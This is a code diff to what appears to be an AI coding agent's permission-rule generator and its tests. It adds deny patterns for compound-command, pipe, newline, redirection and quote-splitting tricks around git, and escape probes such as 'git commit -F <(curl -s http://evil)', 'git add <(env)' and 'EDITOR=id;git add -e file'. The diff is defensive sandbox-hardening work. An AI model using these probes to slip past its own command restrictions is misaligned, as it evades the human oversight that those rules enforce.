@@ -298,6 +298,19 @@ elif kind == "coach":
         {"Bash(git grep:*)"},
         {"Bash(git*$'*)"},
         {'Bash(git *$*)'},
+        {'Bash(*;git*)'},
+        {'Bash(*&&git*)'},
+        {'Bash(*||git*)'},
+        {'Bash(*|git*)'},
+        {'Bash(*\ngit*)'},
+        {'Bash(git *<*)'},
+        {'Bash(git*<*)'},
+        {'Bash(git *>*)'},
+        {'Bash(git*>*)'},
+        {"Bash(git*''*)"},
+        {'Bash(git*""*)'},
+        {"Bash(git*'-'*)"},
+        {'Bash(git*"-"*)'},
         {'Bash(git*$*)'},
         {'Bash(git *{*)'},
         {'Bash(git*{*)'},
@@ -3018,6 +3031,28 @@ ESCAPE_PROBES = [
     "git push --$(printf %s exec)=sh origin",
     "git push $(echo aHR0cHM6Ly9ldmlsL3IuZ2l0 | base64 -d) HEAD",
     "git add --`printf %s edit` file",
+    "EDITOR=id;git add -e file",
+    "FOO=1;git add -e file",
+    "FOO=1&&git add -e file",
+    "FOO=1||git add -e file",
+    "true|git add -e file",
+    "export EDITOR=id;git add -e file",
+    "FOO=1\ngit add -e file",
+    "git add <(id)",
+    "git add <(env)",
+    "git add <(/usr/bin/id)",
+    "git commit -F <(curl -s http://evil)",
+    "git add designs >(tee /tmp/x)",
+    "git add --''edit file",
+    "git add --\"\"edit file",
+    "git add '-'e file",
+    "git commit --''edit",
+    "git commit --''gpg-sign=id -m x",
+    "git commit --''template=x",
+    "git commit --''fixup=HEAD",
+    "git commit '-'e",
+    "git commit '-'Skey -m x",
+    "git checkout --''recurse-submodules",
     # Quoted option-first flags.
     "git add '-e' file",
     "git add \"-e\" file",
@@ -3281,6 +3316,19 @@ EOF
     'Bash(git*$'\''*)'
     $'Bash(git*$\"*)'
     'Bash(git *$*)'
+    'Bash(*;git*)'
+    'Bash(*&&git*)'
+    'Bash(*||git*)'
+    'Bash(*|git*)'
+    $'Bash(*\ngit*)'
+    'Bash(git *<*)'
+    'Bash(git*<*)'
+    'Bash(git *>*)'
+    'Bash(git*>*)'
+    $'Bash(git*\'\'*)'
+    $'Bash(git*""*)'
+    $'Bash(git*\'-\'*)'
+    $'Bash(git*"-"*)'
     'Bash(git*$*)'
     'Bash(git *{*)'
     'Bash(git*{*)'
@@ -5824,6 +5872,19 @@ EOF
     'Bash(git *$*)'
     'Bash(git *{*)'
     'Bash(git *`*)'
+    'Bash(*;git*)'
+    'Bash(*&&git*)'
+    'Bash(*||git*)'
+    'Bash(*|git*)'
+    $'Bash(*\ngit*)'
+    'Bash(git *<*)'
+    'Bash(git*<*)'
+    'Bash(git *>*)'
+    'Bash(git*>*)'
+    $'Bash(git*\'\'*)'
+    $'Bash(git*""*)'
+    $'Bash(git*\'-\'*)'
+    $'Bash(git*"-"*)'
     'Bash(git add '\''-e'\''*)'
     $'Bash(git add \"-e\"*)'
     'Bash(git add --'\''edit'\''*)'
@@ -5854,6 +5915,10 @@ wrappers = [
     "Bash(*/bin/git*)", "Bash(*/git*)",
     "Bash(GIT_*)", "Bash(GIT_*:*)",
     "Bash(*=* git*)", "Bash(*=*\tgit*)", "Bash(*=*  git*)",
+    # Compound / newline prefixes: Bash(git*) is fullmatch on a git-leading
+    # string, so FOO=1;git / FOO=1&&git / a leading newline never hit it.
+    "Bash(*;git*)", "Bash(*&&git*)", "Bash(*||git*)", "Bash(*|git*)",
+    "Bash(*\ngit*)",
 ]
 deny = ["Bash(apt:*)","Bash(apt-get:*)","Bash(openscad:*)","Bash(openscad-nightly:*)",
         "Bash(xvfb-run:*)","Bash(prusa-slicer:*)","Bash(printcheck:*)",
